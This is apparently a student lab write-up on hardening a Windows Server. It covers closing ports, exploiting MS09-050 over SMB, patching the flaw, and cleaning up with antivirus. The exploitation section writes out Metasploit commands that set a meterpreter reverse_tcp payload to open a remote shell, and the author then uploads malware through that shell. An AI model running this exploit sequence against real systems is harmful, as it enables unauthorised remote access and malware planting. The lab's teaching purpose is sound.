In this lab, I will be combining using red-teaming skills on a Windows
Server with hardening concepts to patch the vulnerability and strengthen
the security of the server

### Finding and Closing Unnecessary Ports

The network topology tells me that the server is on 192.168.1.10, so I
conduct an Nmap scan on the system with a Kali machine to see any ports
that are open. It shows MANY open ports

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image10.png){width="6.623565179352581in"
height="5.326643700787401in"}

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image11.png){width="5.503438320209974in"
height="2.345909886264217in"}

Now, acting as the Windows Server, I can close some of these ports and
other unnecessary services

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image3.png){width="7.401042213473316in"
height="4.96833552055993in"}

Additionally, I can delete and disable some unnecessary services that
had an exception rule applied to them on the firewall

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image6.png){width="5.501314523184602in"
height="4.086894138232721in"}

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image14.png){width="4.858310367454068in"
height="5.1999103237095365in"}

Finally, conducting another Nmap scan on the server shows that these
unneeded and vulnerable services are now closed, sealing up major
security risks to the system and network, **especially insecure services
such as telnet and ftp.**

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image12.png){width="7.817708880139983in"
height="4.535900043744532in"}

###  

### Exploiting

Even with some of the major vulnerable services closed up, it's still
possible to exploit this machine through the ports that SMB uses: 139
and 445

I will be exploiting the MS09-050 vulnerability that has not been
patched yet to gain access to the machine and upload malware.

\`use exploit/windows/smb/ms09_050_smb2_negotiate_func_index\`

\`set RHOST 192.168.1.10\`

\`set LHOST 192.168.1.101\`

\`set payload windows/meterpreter/reverse_tcp\`

\`exploit\`

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image8.png){width="8.473958880139982in"
height="3.837263779527559in"}

Now, I can use meterpreter commands that I've learned to navigate to the
Desktop directory of the administrator account and upload my malware as
well as a random text file I created

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image4.png){width="5.713542213473316in"
height="3.294743000874891in"}

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image2.png){width="4.588542213473316in"
height="4.7113702974628175in"}

### Patching the Vulnerability

On the Windows computer, I can install the appropriate updates on the
machine, then restart the machine, to fully patch the vulnerability.

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image7.png){width="7.515625546806649in"
height="4.473850612423447in"}

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image5.png){width="3.9843755468066493in"
height="3.7074945319335084in"}

While the machine was restarting, and when it finished rebooting, I
noticed that I was virtually kicked out of the meterpreter shell on the
linux machine as none of the normal commands were working

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image1.png){width="10.0in"
height="1.5277777777777777in"}

Then after a while, it alerted me that the session was ended

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image15.png){width="8.29687554680665in"
height="2.7915529308836398in"}

Attempting to run the exploit again results in unsuccessful attempts to
gain access to the machine, the vulnerability has been patched and the
exploit no longer works

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image9.png){width="7.890625546806649in"
height="2.8506332020997376in"}

### Cleaning up the Windows Machine

Even though I was able to patch the vulnerability, some damage had
already been done with the virus being uploaded from the attacker
machine. I can run an antivirus scan on the Windows Server, with
Microsoft Security Essentials, to scan for and remove any malware that
could have been uploaded.

![](output\e. Patching, Securing Systems, and Configuring Anti-Virus/media/image13.png){width="7.411458880139983in"
height="4.979573490813649in"}
